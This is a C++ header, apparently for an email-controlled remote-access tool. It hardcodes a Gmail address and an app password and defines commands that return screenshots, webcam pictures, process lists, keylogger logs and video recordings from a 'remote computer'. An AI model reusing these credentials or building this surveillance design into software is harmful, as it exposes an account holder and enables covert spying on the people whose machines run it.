#pragma once
#include <string>
#include <map>
#include <ws2tcpip.h>

const std::string CLIENT_SAVE_DIR = "C:/MMT/";

inline std::string gmail_username = "serverbottestmmt@gmail.com";
inline std::string app_password = "qljblnttdobhrtfe";
inline std::string ca_bundle_path = "../thirdparty/cacert.pem";

static const std::map<std::string, std::pair<std::string, std::string>> FILE_COMMANDS = {
    {"get_screenshot", {"Screenshot from remote computer", "screenshot.png"}},
    {"get_picture", {"Picture from remote computer", "picture.png"}},
    {"list_program", {"Running programs from remote computer", "running_programs.txt"}},
    {"list_process", {"Process list from remote computer", "processes_with_pid.txt"}},
    {"list_installed", {"Installed programs from remote computer", "installed_programs.txt"}},
    {"keylogger", {"Keylogger log from remote computer", "keylog.txt"}},
    {"stop_recording", {"Video recording from remote computer", "recording.avi"}}
};

bool is_keylogger_command(const std::string &command);
bool is_start_program_command(const std::string &command);

void process_command(const std::string &command, const std::string &senderEmail);

SOCKET connect_to_server(const std::string &host, int port);